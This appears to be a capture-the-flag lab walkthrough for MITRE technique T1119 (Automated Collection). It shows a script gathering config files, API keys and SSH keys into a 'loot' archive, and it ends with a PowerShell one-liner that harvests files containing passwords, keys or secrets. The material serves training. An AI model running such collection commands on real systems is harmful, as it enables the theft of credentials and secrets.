# T1119 – Automated Collection | Solution Walkthrough
**Difficulty:** Intermediate | **OS:** Linux | **MITRE:** T1119

## Step 1 – Review the Collector
```bash
cat /opt/auto_collect.sh
# Searches for: *.conf, *.ini, .env, log files, user documents, SSH keys
```

## Step 2 – Run Automated Collection
```bash
sudo bash /opt/auto_collect.sh
# [*] Collecting config files...
#   [+] /opt/app/configs/app.conf
#   [+] /opt/app/configs/api_keys.txt
# [*] Collecting log files...
#   [+] /var/app/logs/access.log
# [+] Collection complete. Output: /tmp/loot_20240101_120000
# [+] Archive: /tmp/loot_20240101_120000.tar.gz
```

## Step 3 – Find the Flag
```bash
grep HACKTIFY /tmp/loot_*/*.conf 2>/dev/null || \
grep -r HACKTIFY /tmp/loot_*/ 2>/dev/null
# /tmp/loot_.../app.conf:HACKTIFY{AUTOMATED_COLLECTION_<hash>}
```

## Step 4 – Inspect Full Loot
```bash
tar tzf /tmp/loot_*.tar.gz
cat /tmp/loot_*/app.conf
```

## Real-World Automation Patterns
```bash
# Windows PowerShell equivalent:
Get-ChildItem C:\ -Recurse -Include *.conf,*.ini,.env -ErrorAction SilentlyContinue |
    Where-Object { Select-String -Path $_ -Pattern "pass|key|secret" -Quiet } |
    Copy-Item -Destination C:\Temp\loot\
```
